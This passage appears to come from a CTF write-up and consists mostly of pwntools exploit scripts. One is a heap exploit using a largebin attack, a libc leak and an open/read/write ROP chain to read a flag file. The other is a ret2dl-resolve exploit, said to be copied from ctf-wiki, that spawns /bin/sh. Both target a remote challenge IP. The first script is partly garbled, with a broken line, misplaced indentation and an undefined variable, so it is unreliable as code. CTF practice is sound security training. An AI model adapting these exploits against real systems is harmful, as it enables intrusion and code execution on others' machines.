        libc=ELF("./libc.so.6")
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,'x00'))
    def cho(num):
        #sleep(0.1)
        p.recvuntil('>> ')
        p.sendline(str(num))
    def add(size):
        cho(1)
        sla("size: ",str(size))
    def free(offset):
        cho(3)
        sla("offset: ",str(offset))
    def edit(offset,content):
        cho(2)
        sla("offset: ",str(offset))
        sla("size: ",str(len(content)))
        sa("content: ",content)
    def g(off):
        return libc_base + off
    def pwn():
        offset = 0x8800-0x7A0
    #    stdout = 0x2620
        stdout = ((0x40|6) largebin
        edit(offset+8+0x360, p64(0x101)+p64(0)+p64(0x101))#p2 size=>0x101
        edit(offset+8+0x460, p64(0x101)+p64(0)+p64(0x101))
        edit(offset+8+0x560, p64(0x101)+p64(0)+p64(0x101))
        free(offset+0x10+0x370)
        add(0x90)#last p1->small bin
        free(offset+0x10+0x360)
        add(0x90)
        edit(offset+8+0x360, p64(0x401) + p64(0) + p16(stdout-0x10)) #p2->bk
    #    edit(offset+8+0x360+0x18, p64(0) + p16(stdout+0x19-0x20)) #p2->bk_nextsize
        edit(offset+8+0x360+0x18, p64(0) + p16(stdout)) #p2->bk_nextsize
        free(offset+0x10+0x360+0x440) #p3
        add(0x90)
        p.recv(0x18)
    #    libc_base = u64(p.recv(8))-libc.symbols['_IO_file_jumps']
        libc_base = u64(p.recv(8))-0x39e5f0
        log.info('libc_base:'+hex(libc_base))
    #    system = libc_base + libc.symbols['system']
        system = libc_base + 0x40D50
    #    _dl_open_hook = libc_base + libc.symbols['_dl_open_hook']
        _dl_open_hook = libc_base + 0x3A22E0
        heap_p3 = u64(p.recv(8))
        heap = heap_p3 - 0x83c0
        log.info('mmap_base:'+hex(heap))
    ###############################################################################################
        offset = 0x100
        edit(offset+8, p64(0x331)) #p1
        edit(offset+8+0x330, p64(0x31))
            edit(offset+8+0x360, p64(0x511)) #p2
            edit(offset+8+0x360+0x510, p64(0x31))
            edit(offset+8+0x360+0x540, p64(0x511)) #p3
            edit(offset+8+0x360+0x540+0x510, p64(0x31))
            edit(offset+8+0x360+0x540+0x540, p64(0x31))
            free(offset+0x10) #p1
            free(offset+0x10+0x360) #p2
            add(0x90)
        io = libc_base + 0x39E500
            edit(offset+8+0x360, p64(0x4f1) + p64(0) + p64(io-0x10) + p64(0) + p64(io-0x20))
            free(offset+0x10+0x360+0x540) #p3
            add(0x200)
    ###        if libc_base > ', '0')
            p.interactive()
    '''
        offset = 0x1000
        edit(offset+8, p64(0x331)) #p1 offset+0x10
            edit(offset+8+0x330, p64(0x31))
            edit(offset+8+0x360, p64(0x511)) #p2
            edit(offset+8+0x360+0x510, p64(0x31))
            edit(offset+8+0x360+0x540, p64(0x521)) #p3
            edit(offset+8+0x360+0x540+0x520, p64(0x31))
            edit(offset+8+0x360+0x540+0x550, p64(0x31))
        free(offset+0x10)    
        free(offset+0x360+0x10)#p2
        add(0x90)#p2 -> largebin    
        edit(offset+8+0x360, p64(0x511) + p64(0) + p64(_dl_open_hook-0x10) + p64(0) + p64(_dl_open_hook-0x20))
        free(offset+0x360+0x540+0x10) #p3
        print(hex(libc_base),hex(system),hex(_dl_open_hook))
        add(0x90) #IO_list_all -> #p3_addr
        if libc_base < 0xff4113b36000:
            z()
        key_rbx_gad = libc_base + 0x8959E #mov rdi, [rbx+48h] ; mov rsi, r13 ; call qword ptr [rbx+40h]
        key_rax_gad = libc_base + 0x6D98A #mov rdi, rax ; call qword ptr [rax+20h]
        setcontext_53 = libc_base + 0x47b40 + 53
        p_rbx_rbp_j = libc_base + 0x000000000012d751 #pop rbx ; pop rbp ; jmp rdx
        p_rsp_r13_r = libc_base + 0x00000000000206c3 #pop rsp ; pop r13 ; ret
        p_rsp_r = libc_base + 0x0000000000003838 #pop rsp ; ret
        p_rdi_r = libc_base + 0x0000000000021102 #pop rdi ; ret
        p_rdx_rsi_r = libc_base + 0x00000000001150c9 #pop rdx ; pop rsi ; ret
        open_addr = libc_base + libc.symbols['open']
        read_addr = libc_base + libc.symbols['read']
        write_addr = libc_base + libc.symbols['write']
        p_rsi_r = libc_base + 0x00000000000202e8 #pop rsi ; ret
        #open_read_write_rop
        rop = './flag'.ljust(8,'x00')+p64(0)+p64(mmap_base)+p64(p_rsi_r)+p64(0)+p64(open_addr)
        rop += p64(p_rdi_r)+p64(4)+p64(p_rdx_rsi_r)+p64(0x100)+p64(mmap_base+1337)+p64(read_addr)
        rop += p64(p_rdi_r)+p64(1)+p64(p_rdx_rsi_r)+p64(0x100)+p64(mmap_base+1337)+p64(write_addr)
        edit(0,rop)
        edit(offset+0x360+0x540, p64(key_rax_gad))#p3
            edit(offset+0x360+0x540+0xa0, p64(mmap_base + 0x10))
        edit(offset+0x360+0x540+0xa8, p64(p_rdi_r))
            edit(offset+0x360+0x540+0x20, p64(setcontext_53))
        free(0x10)    
        p.interactive()
    '''
    while True:
        try:
            pwn()
            break
        except:
            p.close()
            p=remote('118.31.11.216',30078)
    #    p=process(['./'+binary_name],env{'LD_PRELOAD':'./'+libc_name})
###  re2dl
貌似是XDCTF2015的题
ctf-wiki上复制exp，直接打
exp：
    #!/usr/bin/python
    from roputils import *
    #from pwn import process
    from pwn import remote
    from pwn import gdb
    from pwn import context
    #r = process('./pwn')
    r = remote('118.31.11.216',36666)
    context.log_level = 'debug'
    r.recv()
    rop = ROP('./pwn')
    offset = 112
    bss_base = rop.section('.bss')
    buf = rop.fill(offset)
    buf += rop.call('read', 0, bss_base, 0x100)
    ## used to call dl_Resolve()
    buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    r.send(buf)
    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    ## used to make faking data, such relocation, Symbol, Str
    buf += rop.dl_resolve_data(bss_base + 20, 'system')
    buf += rop.fill(100, buf)
    r.send(buf)
    r.interactive()